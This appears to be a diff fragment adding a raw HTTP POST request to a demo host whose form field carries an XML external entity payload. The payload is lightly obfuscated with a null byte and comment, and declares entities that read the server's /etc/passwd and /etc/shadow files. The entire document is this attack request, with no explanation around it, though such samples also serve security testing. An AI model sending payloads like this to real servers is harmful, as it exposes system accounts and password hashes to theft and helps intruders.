@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 131
+Connection: close
+
+file=<!/*%00*/DOCTYPE r [<!ENTITY % p SYSTEM "file:///etc/passwd"><!ENTITY % q "<!ENTITY x SYSTEM 'file:///etc/shadow'>"> %q;]><r/>
